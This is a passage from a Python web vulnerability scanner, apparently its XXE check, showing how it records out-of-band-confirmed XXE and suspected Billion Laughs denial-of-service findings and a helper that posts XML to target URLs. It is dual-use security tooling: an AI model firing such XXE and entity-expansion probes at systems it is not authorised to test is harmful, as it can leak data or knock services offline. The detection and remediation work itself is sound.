                        confidence="confirmed",
                        evidence={
                            "payload": payload[:200],
                            "type": f"xxe_{xxe_type}",
                            "token": token,
                            "callback": callback,
                        },
                        summary=f"XXE ({xxe_type}) in parameter '{param}' (OOB confirmed)",
                        description=(
                            f"The XML parser processes external entities, allowing an attacker to "
                            f"exfiltrate data via OOB channel."
                        ),
                        steps_to_reproduce=(f"1. Send XXE with external entity\n2. Observe OOB callback"),
                        impact="XXE allows data exfiltration, SSRF, and DoS.",
                        remediation="Disable external entity processing. Use safe parser configurations.",
                    )

            elif xxe_type == "dos":
                # Check for timeout or error
                if test["status"] == 0 or test["status"] >= 500:
                    return self._make_finding(
                        endpoint=endpoint,
                        param=param,
                        confidence="suspected",
                        evidence={
                            "payload": payload[:200],
                            "type": "xxe_dos",
                            "response_status": test["status"],
                            "note": "Entity expansion may cause DoS; verify carefully",
                        },
                        summary=f"Potential XXE DoS (Billion Laughs) in parameter '{param}'",
                        description=(
                            f"The XML parser may be vulnerable to entity expansion DoS attack "
                            f"(billion laughs)."
                        ),
                        steps_to_reproduce=(f"1. Send nested entity payload\n2. Observe server slowdown/crash"),
                        impact="XML entity expansion can cause denial of service.",
                        remediation="Limit entity expansion depth. Disable DTDs. Set entity expansion limits.",
                    )

        return None

    async def _post_xml(self, url: str, xml: str, content_type: str = "application/xml") -> Optional[Dict[str, Any]]:
        try:
            resp = await self.http_client.post(
                url,
                content=xml,
                headers={"Content-Type": content_type},
                timeout=settings.REQUEST_TIMEOUT,
            )
            return {"status": resp.status_code, "body": resp.text}
        except Exception:
            return None